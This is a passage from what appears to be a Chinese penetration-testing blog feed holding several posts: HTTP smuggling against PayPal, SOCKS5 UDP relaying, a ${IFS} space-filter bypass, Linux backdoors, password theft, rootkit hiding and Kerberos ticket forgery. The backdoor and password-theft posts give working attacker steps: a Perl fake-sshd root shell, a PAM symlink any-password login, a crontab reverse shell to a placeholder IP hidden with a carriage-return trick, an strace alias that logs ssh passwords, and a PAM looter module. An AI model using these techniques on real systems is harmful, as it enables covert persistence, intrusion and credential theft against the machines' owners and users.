alt="paypal-csp"></p><p>攻击者继续寻找，发现了登陆界面有一个iframe加载了一个c.paypal.com上的子页面，并且此子页面没有使用CSP，同时导入了我们投毒的js文件，这时候攻击者就获得了iframe的完全控制权</p><p><img src="/image/HTTP-Smuggling/paypal-iframe.jpg" alt="paypal-iframe"></p><h3 id="解决同源策略"><a href="#解决同源策略" class="headerlink" title="解决同源策略"></a>解决同源策略</h3><p>但是，此时由于c.paypal.com与paypal.com不同源，同源策略限制了对paypal.com的DOM树的访问</p><p>故而，攻击者进一步查找，终于在paypal.com/us/gifts上找到了一个不使用CSP，且导入了投毒后的js文件的网页，而因为攻击者已经完全控制了iframe，故而攻击者可以将此iframe重定向至paypal.com/us/gifts并第三次触发投毒后的js文件导入，从而籍被污染的js文件来操作paypal.com/signin的界面，获取明文的用户名密码。</p><p><img src="/image/HTTP-Smuggling/paypal-success.jpg" alt="paypal-success"></p><h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><p>paypal修复了这个漏洞，通过将akamai配置为拒绝<code>Transfer-Encoding: chunked</code>来修复此问题</p><p>但是albinowax随后发现，如果将TE头修改成下面这种形式，将可以绕过paypal的缓解措施:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding:</span><br><span class="line">chunked</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>通过学习albinowax大神的文章以及相关的知识，又掌握了一个小小的黑科技hh，其实没有什么没用的漏洞，完全是看利用者的水平，菜刀在高手的手里，也会变成精巧无比的手术刀。</p><p>另外，立个flag，速速把缓存毒化的blog也搞出来hh</p>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Socks5中UDP Associate特性实现与trick</title>
      <link href="Socks5-UDP.html"/>
      <url>Socks5-UDP.html</url>
      
        <content type="html"><![CDATA[<h2 id="RFC文档"><a href="#RFC文档" class="headerlink" title="RFC文档"></a>RFC文档</h2><p>首先要实现这个特性，那么必不可少的，需要去查看这个定义此特性的<a href="https://www.ietf.org/rfc/rfc1928.txt">RFC1928</a></p><p>这里要吐槽一下，由于此RFC文档又使用了传统艺能 – xxx MAY xxx，所以文档对于此功能的描述是模糊的，很多相关问题并没有详细的说明，所以可能各人的实现方法也会有些许的不同，但是大体上还是有一个共识，不会过分影响其核心的功能</p><p>通过阅读此RFC，可以得出主要的几个要点：</p><ul><li>UDP Associate中的每一个UDP Listener生存周期必须与其最初协商时所使用的tcp链接相关，即一个UDP Associate请求最终会对应一条tcp链接和一个UDP Listener，当tcp链接断开时，UDP Listener也将会退出，反之亦然</li><li>在udp客户端发出的UDP Associate请求中应当带上自己期望发送数据的源端口及源地址，而socks5服务器可以选择是否基于此来对数据来源进行限制(RFC原文：The UDP ASSOCIATE request is used to establish an association within the UDP relay process to handle UDP datagrams. The DST.ADDR and DST.PORT fields contain the address and port that the client expects to use to send UDP datagrams on for the association.  The server MAY use this information to limit access to the association.  If the client is not in possesion of the information at the time of the UDP ASSOCIATE, the client MUST use a port number and address of all zeros.)  </li><li>UDP Associate中的所有udp请求都应当带上一个标准的包头，标示此udp包的目的地(供socks5 server解析)以及标示此包的响应者(供UDP Client解析)</li><li>socks5服务器可以选择不处理分片的udp请求，UDP Client应当自己负责重传丢包的问题</li><li>UDP Associate的协商是在最初的TCP连接上实现的，即要用UDP Associate，必须先像TCP Connect一样先打开一个tcp链接来与socks5服务器通讯，完成相关协商后，再打开UDP通讯信道进行实际的UDP包relay</li></ul><p>在以上的几个要点中，第二点有个问题就是很多支持socks5代理的udp客户端并没有严格执行这一标准，在UDP Associate请求包里携带的仍然是目标ip及port，为了保持对这种客户端的兼容，我在具体实现的过程中以第一个向协商后的udp端口发送数据的源ip+port作为标准(因为一般在UDP Associate后，客户端会在极短的时间内向协商好的端口发送数据)，放弃了以UDP Associate包作为标准的尝试。</p><p>另外，虽然RFC文档中没有说明是否一个UDP Associate链接应当只对应一个目的IP+port，但是基于其第三条要点，推测其大概率允许一个UDP Associate所创建的listener对应多个目的IP+port，只要在标准的包头中定义好此包的目的IP+port即可</p><h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><p>由于网上开源的socks5服务器99%都是单独的服务器，不会涉及多跳的问题，故而我的工具实现起来会较复杂一些</p><p>首先agent需要在接收到client发来的UDP Associate请求后，现在自身机器上打开一个UDP Listener，之后向admin提交启动UDP Associate的消息，admin在收到此消息后也在本地打开一个UDP listener，并且回复agent，告知自身listener的详细信息，agent在收到此消息后，将此详细信息中包含的listener地址+端口以标准的socks5响应回复给client。此时client就可以向admin的此listener发送数据了，admin会将这些数据打包后发送给对应的agent，agent解析并保存要点三中的标头，将数据包发送给对应IP+port。agent在收到相关udp包的回复包后，查找存储的标头，用此标头重新封装回复包，打包返回给admin，admin在收到此数据包后，查找对应的UDP Listener，将数据包由对应的UDP Listener发送给client，从而完成通讯</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>实际上UDP Associate在实际应用中非常小众，一方面是应用场景不够多，另一方面就是性能也不够好(一个UDP Associate需要消耗一个UDP Listener和一个TCP Conn)，还有就是对于client要求也比较高，要求client自身拥有处理丢包重传的能力，socks5服务器是不管理丢包重传方面的问题的。</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> code </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hackerone-Knowledege</title>
      <link href="Hackerone-Knowledege.html"/>
      <url>Hackerone-Knowledege.html</url>
      
        <content type="html"><![CDATA[<ul><li>当一个命令执行漏洞过滤了空格符号且后端服务器为linux时，可以利用<code>$&#123;IFS&#125;</code>这个特殊的内置变量来绕过，此变量是bash中默认的域分隔符。其默认值是空格，tab, 和新行(即” \r\n”，其中” \r\n”任意一个值都代表”空白”)。并且当遇到需要分割字符串的场景时，多个连续的空白将会被压缩为一个空白（经测试，压缩为了空格），故而可以用来代替空格使用。</li></ul><p>还有一些别的方法，例如：</p><p>ls$IFS-la<br>ls$IFS$100-la</p>]]></content>
      
      
      <categories>
          
          <category> 赏金猎人 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bug bounty </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux后门权限维持</title>
      <link href="Linux-backdoors.html"/>
      <url>Linux-backdoors.html</url>
      
        <content type="html"><![CDATA[<h2 id="sshd后门"><a href="#sshd后门" class="headerlink" title="sshd后门"></a>sshd后门</h2><p>sshd后门应该是比较老的一种后门维持方式了，简单来说需要的条件是目标机上需要装有perl环境以及root权限</p><p>在获取root权限后，首先<code>cp /usr/sbin/sshd /usr/bin/sshd</code>保存一份真的sshd文件</p><p>之后在sbin目录下新建一个sshd文件，并在里面写入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;perl</span><br><span class="line">exec&quot;&#x2F;bin&#x2F;sh&quot;if(getpeername(STDIN)&#x3D;~&#x2F;^..zf&#x2F;);</span><br><span class="line">exec&#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125;&quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV;</span><br></pre></td></tr></table></figure><p>代码的解释:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一行， 如果当前文件句柄STDIN是一个socket，且socket的远程连接源端口是31334（Big 网络字节序中的16进制字符串为\x00\x00zf， 正好匹配上perl正则 ..zf，上述代码中的zf是Big 网络字节序的Ascii表示形式），则执行&#x2F;bin&#x2F;sh，并结束当前程序运行（不会执行第二步），相当于反弹一个root shell （因为sshd 是以root权限运行的）给远程socket  （一般只有攻击者指定连接的源端口才能触发这一行的执行）</span><br><span class="line"></span><br><span class="line">第二行  启动sshd (&#x2F;usr&#x2F;bin&#x2F;sshd是真正的sshd)服务 ，凡是传递给&#x2F;usr&#x2F;sbin&#x2F;sshd (后门)的参数都传递给真正的sshd （这一行保证了普通用户也可以正常使用ssh 服务，登录并不会有什么异常现象）</span><br></pre></td></tr></table></figure><p>之后保存文件，并<code>chmod +x sshd</code></p><p>重启sshd服务<code>service sshd restart</code></p><p>之后想要连接时只需要使用socat，执行以下语句即可:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat STDIO TCP4:192.168.0.7:22,sourceport&#x3D;31334</span><br></pre></td></tr></table></figure><p>语句代表的意思为在本机的标准输入输出与远端的192.168.0.7:22建立pipe以此来传输数据</p><p>而在连接建立的时候，目标机会首先启动sshd来处理连接，此时由于标准输入还未被重定向至socat建立的socket，故而此时脚本第一句执行失败，直接去执行了真正的sshd文件，然后sshd文件被执行后会fork一个子进程来处理传入的连接，与其他的程序fork子进程不一样，sshd fork子进程后，子进程会再次执行sshd（重点），故而控制权又回到了我们的伪造sshd的手上，而此时此子进程的标准输入输出已经被重定向至socat建立的socket，故而正则表达式匹配正确，目标及执行/bin/sh并返回一个root权限的shell</p><p>如下图：</p><p><img src="/image/Linux_Backdoor/sshd.jpg" alt="sshd"></p><h2 id="ssh-pam任意密码后门"><a href="#ssh-pam任意密码后门" class="headerlink" title="ssh pam任意密码后门"></a>ssh pam任意密码后门</h2><p>同样也是很常见的后门了，基于以下语句实现:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oPort&#x3D;1337</span><br><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;chsh;&#x2F;tmp&#x2F;chsh -oPort&#x3D;1337</span><br><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;chfn;&#x2F;tmp&#x2F;chfn -oPort&#x3D;1337</span><br><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;runuser;&#x2F;tmp&#x2F;runuser -oPort&#x3D;1337</span><br></pre></td></tr></table></figure><p>在root权限下执行以上语句，就可以输入任意密码登陆任意用户</p><p><img src="/image/Linux_Backdoor/anypass.jpg" alt="anypass"></p><p>这里我随便输入了一个密码，就可以登录root用户</p><p>很奇怪，不是么？那么这是为什么呢？</p><p>首先就是sshd默认支持pam认证登录，而登录时，系统选择的pam文件名将是启动的程序文件名，就比如我们使用<code>/tmp/su</code>来启动sshd，那么在pam认证时，将会使用<code>/etc/pam.d/su</code>来作为认证文件</p><p>此外，在<code>/etc/pam.d/su</code>中，有一句<code>auth sufficient pam_rootok.so</code>，这里要说明一下pam的控制关键字：</p><p><img src="/image/Linux_Backdoor/pam.jpg" alt="pam"></p><p>也就是说，只要<code>pam_rootok.so</code>模块返回true，则pam认证流程将会直接成功</p><p>接着，我们就需要知道如何让<code>pam_rootok.so</code>模块返回true，通过查询相关资料，我们可以知道<code>pam_rootok.so</code>直接判断了当前的uid是否为0</p><p><img src="/image/Linux_Backdoor/how-pam_rootok-work.jpg" alt="how-pam_rootok-work"></p><p>如果你再去看看<code>pam_rootok.so</code>的源码，你会发现它使用了getuid()来判断uid</p><p>而getuid()的解释原文<code>getuid() returns the real userID of the calling process</code></p><p>这下就很清晰了，为何我们能够通过<code>pam_rootok.so</code>的认证，是由于调用这个模块的进程是/usr/sbin/sshd，并且这个进程是以root权限运行的，此时getuid()将返回0，这样就保证了不管输入什么密码，<code>pam_rootok.so</code>都会认证成功，从而向sshd进程返回success，通过认证阶段</p><p>从以上的分析，可以发现实现这样的trick，是需要一些条件的</p><ol><li><code>/etc/ssh/sshd_config</code>中必须为<code>UsePAM yes</code>，即允许pam认证(默认)</li><li>ssh必须允许root用户远程登录(如果不允许root远程登录，也可用其他的已存在用户)</li><li>调用的pam模块必须包含<code>auth sufficient pam_rootok.so</code>，而符合条件的模块除了su，还有chsh，chfn，runuser</li><li>创建的软链接文件的文件名必须是pam模块名，不可随意起名，因为选择模块即是基于文件名选择</li></ol><h2 id="crontab后门"><a href="#crontab后门" class="headerlink" title="crontab后门"></a>crontab后门</h2><p>这个怕是老生常谈了，基本上每一个管理员在意识到中毒后都会执行<code>crontab -l</code>查看一下定时任务</p><p>当然，这里不会只是简单写入定时任务，这没有任何意义</p><p>实际上，我们可以借助一些trick来隐藏<code>crontab -l</code>的输出，从而欺骗管理员</p><p>例如，执行如下语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(crontab -l;printf &quot;*&#x2F;60 * * * * exec 9&lt;&gt; &#x2F;dev&#x2F;tcp&#x2F;xxx.xxx.xxx.xxx&#x2F;4444;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;&#x2F;bin&#x2F;bash --noprofile -i;\rno crontab for &#96;whoami&#96;%100c\n&quot;)|crontab -</span><br></pre></td></tr></table></figure><p>此时管理员如果执行<code>crontab -l</code>，将会发现没有任何异常</p><p><img src="/image/Linux_Backdoor/crontab.jpg" alt="crontab"></p><p>可以看到，如果用vim打开对应的计划任务文件，可以清晰看见恶意的任务，但是，当管理员执行<code>crontab -l</code>时，却只能看见<code>no crontab for xxx</code></p><p>那么这是为啥呢？</p><p>原理在于，<code>crontab -l</code>实际上是使用了cat命令，但是cat命令默认将会解析\r，而\r的意思是回到行首，在payload中，我们又用了<code>%100c</code>创建了100个空字符“覆盖”了恶意的payload，所以在<code>crontab -l</code>时，无法看到被“覆盖”的恶意payload，从而达到了隐藏的效果</p><h2 id="各类rootkit"><a href="#各类rootkit" class="headerlink" title="各类rootkit"></a>各类rootkit</h2><p>linux rootkit算是最好用的也最强大的后门，github上有不少大师傅也开源了不少rootkit，我自己也在研究中，想自己写一个rootkit XD</p><p>写完后再添加link hh</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码“水坑”</title>
      <link href="Steal-password-by-alias.html"/>
      <url>Steal-password-by-alias.html</url>
      
        <content type="html"><![CDATA[<h1 id="第一个暗桩-–-ssh命令"><a href="#第一个暗桩-–-ssh命令" class="headerlink" title="第一个暗桩 – ssh命令"></a>第一个暗桩 – ssh命令</h1><p>  当我们控制了一台linux服务器，并且发现有用户使用这台机器通过ssh连接其他机器的时候，那么假设我们有此用户的权限的shell，这时我们就可以巧用alias来窃取用户的密码</p><p>  首先我们将会用到strace命令，这在大部分的linux机器当中都有预装。为了劫持用户的ssh命令，我们需要修改～/.bashrc（修改前请先备份）</p><p>  在.bashrc中加入如下语句：</p><p>  alias ssh=’strace -o  /var/tmp/.syscache-<code>date +&#39;%Y-%m-%d+%H:%m:%S&#39;</code>.log -s 4096 ssh’</p><p>  这句话的意思就是当用户使用ssh时，实际上我们悄悄的对ssh使用了strace来跟踪其调用过程，并将其输出文件保存在/var/tmp下，这样，当合法用户登陆被我们控制的机器，并使用ssh登陆其他机器的时候，其登陆其他机器时输入的密码、地址就会被我们记录下来。如下图</p><p><img src="/image/Steal-pass/strace.jpg" alt="strace"></p><p>此时我们使用grep，查找密码以及用户登陆的地址：</p><p><img src="/image/Steal-pass/password.jpg" alt="password"></p><p><img src="/image/Steal-pass/address.jpg" alt="address"></p><p>可以看到成功捕获了用户名、地址、密码</p><h1 id="第二个暗桩-–-窃取sudo密码"><a href="#第二个暗桩-–-窃取sudo密码" class="headerlink" title="第二个暗桩 – 窃取sudo密码"></a>第二个暗桩 – 窃取sudo密码</h1><p>  当我们控制了一台linux服务器，并且发现自己控制的用户经常使用sudo执行命令时，我们也可以巧用alias来窃取用户的sudo密码</p><p>  自己也写了个小工具：<a href="https://github.com/ph4ntonn/Impost3r">Impost3r</a></p><p>  只需要合法用户登陆后使用sudo命令，就可以窃取到其密码，从而变相提权，甚至可以可以拿来做ssh账户/密码，大多数人密码都是一样的</p><h1 id="第三个暗桩-–-劫持各类系统命令"><a href="#第三个暗桩-–-劫持各类系统命令" class="headerlink" title="第三个暗桩 – 劫持各类系统命令"></a>第三个暗桩 – 劫持各类系统命令</h1><p>  这个和第二个很像，但是我觉得不是很妥当，毕竟会弹出非预期的询问密码的操作，故而不去使用</p><h1 id="第四个暗桩-–-修改pam文件"><a href="#第四个暗桩-–-修改pam文件" class="headerlink" title="第四个暗桩 – 修改pam文件"></a>第四个暗桩 – 修改pam文件</h1><p>  在linux当中，用户的认证都是基于pam的，也就是说如果我们在获取了root权限的情况下,可以通过修改pam相关模块及配置来窃取所有通过ssh登陆至此机器的用户名/密码、所有执行su命令的用户名/密码</p><p>  有一个小工具:<a href="https://github.com/mthbernardes/sshLooterC">looterc</a></p><p>  稍加修改，并进行编译，得到<code>looter.so</code>，并将此so复制至<code>/lib/security</code>下(如果是ubuntu，应当在<code>/lib/x86_64-linux-gnu/security</code>下)</p><p>  再修改<code>/etc/pam.d/</code>下的common-auth，在最后一行加上以下两句语句:</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auth optional looter.so</span><br><span class="line">account optional looter.so</span><br></pre></td></tr></table></figure><p>  保存并退出后，任何使用su命令的普通用户的用户名和密码都将会被捕获</p><p>  如果想窃取所有ssh到此机器上的用户名/密码，那么就修改<code>/etc/pam.d/</code>下的sshd文件，同样在最后加上同样的两句语句</p><p>  保存并退出后，任何使用ssh命令连接到此机器的用户的用户名和密码都将会被捕获</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>  手法要骚，想法要淫荡（笑）</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rootkit分析&amp;&amp;linux内核机制学习（一）</title>
      <link href="rootkit%E5%88%86%E6%9E%90-linux%E5%86%85%E6%A0%B8%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0.html"/>
      <url>rootkit%E5%88%86%E6%9E%90-linux%E5%86%85%E6%A0%B8%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0.html</url>
      
        <content type="html"><![CDATA[<h1 id="rootkit自身隐藏及保护"><a href="#rootkit自身隐藏及保护" class="headerlink" title="rootkit自身隐藏及保护"></a>rootkit自身隐藏及保护</h1><h2 id="隐藏自身"><a href="#隐藏自身" class="headerlink" title="隐藏自身"></a>隐藏自身</h2><p>先讲讲自身的隐藏，这里主要是用到了以下函数段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">module_list &#x3D; THIS_MODULE-&gt;list.prev;</span><br><span class="line"></span><br><span class="line">list_del(&amp;THIS_MODULE-&gt;list);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中module_list保存了此模块所在的链表结构体的第一个结构体，即链表的头节点，以便之后的恢复操作</p><p>list_del函数将此模块所在的链表结构体的头节点删除，即将代表自身的结构体删除，从而在lsmod命令中隐藏此模块</p><h2 id="恢复自身"><a href="#恢复自身" class="headerlink" title="恢复自身"></a>恢复自身</h2><p>讲完隐藏，讲讲自身恢复</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">list_add(&amp;THIS_MODULE-&gt;list, module_list);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里利用到了list_add函数，将之前保存的module结构体（即之前代表自身的结构体）添加到链表头，从而重新在lsmod命令中可见</p><h2 id="保护自身不被删除"><a href="#保护自身不被删除" class="headerlink" title="保护自身不被删除"></a>保护自身不被删除</h2><p>保护自身不被删除主要利用了以下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">try_module_get(THIS_MODULE);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用了try_module_get函数，将模块的使用计数加一，从而使得模块表现为“正在被使用”，由于linux不能卸载正在使用的模块，从而保护自身不被删除</p><h2 id="解除保护"><a href="#解除保护" class="headerlink" title="解除保护"></a>解除保护</h2><p>解除保护代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module_put(THIS_MODULE); </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用了module_put函数，将模块的使用计数减一至0，从而将其表示为空闲状态以卸载</p><h1 id="rootkit查找系统调用表"><a href="#rootkit查找系统调用表" class="headerlink" title="rootkit查找系统调用表"></a>rootkit查找系统调用表</h1><p>  首先系统调用表（syscall_table)是存在在内核中的一个数组，里面存放了所有指向系统调用函数的指针，故而rootkit若想hook系统调用，就必须先找到syscall_table在内存当中的地址（在早期的Linux内核中，是通过一个变量SYSCALL_TABLE明确指出其位置的，而在较新的kernel中移除了这一个变量，防止被滥用）</p><p>  此rootkit采用的是暴力搜索遍历的方式来找到syscall_table，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">void **sys_call_table;</span><br><span class="line"></span><br><span class="line">void **find_syscall_table(void)</span><br><span class="line">&#123;</span><br><span class="line">    void **sctable;</span><br><span class="line">    void *i &#x3D; (void*) START_ADDRESS;</span><br><span class="line"></span><br><span class="line">    while (i &lt; END_ADDRESS) &#123;</span><br><span class="line">        sctable &#x3D; (void **) i;</span><br><span class="line"></span><br><span class="line">        if (sctable[__NR_close] &#x3D;&#x3D; (void *) sys_close) &#123;</span><br><span class="line">            size_t j;</span><br><span class="line">            const unsigned int SYS_CALL_NUM &#x3D; 300;</span><br><span class="line">            for (j &#x3D; 0; j &lt; SYS_CALL_NUM; j ++) &#123;</span><br><span class="line">                if (sctable[j] &#x3D;&#x3D; NULL) &#123;</span><br><span class="line">                    goto skip;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            return sctable;</span><br><span class="line">        &#125;</span><br><span class="line">skip:</span><br><span class="line">        ;</span><br><span class="line">        i +&#x3D; sizeof(void *);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先我们先要确定一个比syscall_table更高位置的内存来作为起始点（不然你遍历不到），之后我们需要知道一个已经确定位置的函数，这里用到了sys_close函数，这个函数的位置是相对于syscall_table处在更低的内存位置，这样就可以用来标示遍历的终点。</p><p>之后将i赋值为内存地址，在每一次遍历中，尝试将i代表的内存地址加上__NR_close（sys_close函数的偏移地址），查看加上偏移地址后的内存中所存放的指针所指向的地址是否指向了sys_close函数的地址，如果是，则代表我们找到了系统调用表的表头，如果不是，那么i加上一个void *的大小（继续推进内存地址），继续进行遍历，直到找到正确的表头</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kerberos黄金白银票据</title>
      <link href="Kerberos-gold-sliver-ticket.html"/>
      <url>Kerberos-gold-sliver-ticket.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>为了方便叙述，假定A为客户端，B为服务端</p><h1 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h1><p>  从上一篇文章中我们可以懂得微软对于windosw系列的Kerberos协议的具体实现过程</p><p>  那么我们可以总结出来一点就是，实际上A作为客户端访问B的时候，其权限完全是基于KDC所颁发的PAC的，B也只认这个PAC，并以这个PAC为参考来决定是否允许A访问B上的一些资源，那也就是说如果我们能够伪造发送给B的serrviceTicket中的PAC，我们就可以随意对B的资源进行访问了</p><p>  让我们来看看构成ServerTicket的必要条件：KDC密码的副本以及B的密码的副本（两者的hash），主要缺少的就是B的密码的hash值，那么如果我们有了这个hash值，我们就可以伪造PAC，伪造PAC后面的校验签名，从而实现对B资源完全的访问权。那么这样的票据就被称为白银票据，拥有这样的票据表示着客户端A对B有着完全的访问权，但是注意了，由于我们同样也不知道KDC的密码hash，所以实际上我们伪造的PAC最后是没有有效的KDC的校验签名的，只有由B的密码hash生成的校验签名，而如果此时服务端开启了KDC PAC签名校验，那么PAC的校验将无法通过，白银票据也就会失效，所以白银票据成功的大前提是请求的服务不校验KDC PAC签名。</p><p>  白银票据的限制就在于只能拥有某一台服务器所提供的部分服务的访问权，而不能拥有所有的，换一台C服务器或者需求权限更高的服务，白银票据就会失去效用。</p><p>  给一些好的参考：<br><a href="/archives/Kerberos/sliverticket.html">银票</a></p><p><a href="/archives/Kerberos/sliverticket_defend.html">银票防御</a></p><p><a href="/archives/Kerberos/sliverticket_exploit.html">银票利用</a></p><h1 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h1><p>  白银票据的限制在黄金票据中不复存在，一旦拥有了黄金票据，你就拥有了这个域当中的最高权限。</p><p>  让我们来回顾一下A发送给B的ServiceTicket是如何生成的</p><p>  首先，是A要向TGS发送由AS颁发的TGT，证明自己已经通过了合法性校验，是域中的合法用户，然后由TGS利用KDC的永久密钥（也称为krgtgt账户的密码hash，krgtgt账户相当于是域管理员）解密TGT，校验签名，确定TGT中的PAC没有被篡改之后，重新签名PAC，并将A与B之间通讯所需要的密钥SessionKey以及重新签名后的PAC用B的密码hash进行加密，将两者组合为了ServiceTicket。</p><p>  那么我们可以看到，这整个过程的关键点就是TGT中所携带的PAC，只要我们能够篡改TGT中的PAC，欺骗TGS，就能拿到访问任意服务器的ServiceTicket。而要想篡改TGT，唯一的障碍就是krgtgt用户的密码hash，有了这个密码的hash，我们就可以解密TGT，伪造任意PAC来欺骗TGS为A颁发在此域中访问任意一台服务器的任意ServiceTicket，获取在此域中的最高权限</p><p>  我们把这种票据称为黄金票据</p><p>  提供一些好的参考:</p><p>  <a href="/archives/Kerberos/goldenticket.html">黄金票据</a></p><h1 id="增强型黄金票据"><a href="#增强型黄金票据" class="headerlink" title="增强型黄金票据"></a>增强型黄金票据</h1><p>  虽然黄金票据在当前域中拥有着最高的权限，但是普通的黄金票据无法跨域使用，因为在一个子域中缺少了EnterpriseAdmins组，这是只有在域林中的根域才存在的用户组，对整个域有着管理权，其SID最后三位为519，而在子域中最高级别的用户仅仅是Domain Admins，SID最后三位为512，那也就表明当使用mimikatz伪造黄金票据时，mimikatz会使用SID号（类似于S-1-5-21-3641416521-285861825-2863956705-）和RID号（512，519之类的）拼接成新的SID（S-1-5-21-3641416521-285861825-2863956705-519），但是这个SID号在根域里根本就不存在（根域DC上的EnterpriseAdmins组的SID可能是S-1-5-21-4249968736-1423802980-663233003-519）,所以无法使用普通的黄金票在域林中跨域访问资源。</p><p>  在2015年Black Hat USA中国外的研究者提出了突破域限制的增强版的黄金票据。通过域内主机在迁移时LDAP库中的SIDHistory属性中保存的上一个域的SID值制作可以跨域的金票。</p><p>  需要的材料只是根域的SID号，一个子域的krgtgt密码hash即可，使用mimikatz制作</p><p>  下面是Blackhat资料，里面内容很多，以后慢慢整理成文章</p><p>  <a href="/archives/Kerberos/blackhat.pdf">BlackHat</a></p><h1 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h1><p>  一般是使用mimikatz来抓取用户的密码hash</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kerberos MS14-068</title>
      <link href="Kerberos.html"/>
      <url>Kerberos.html</url>
      
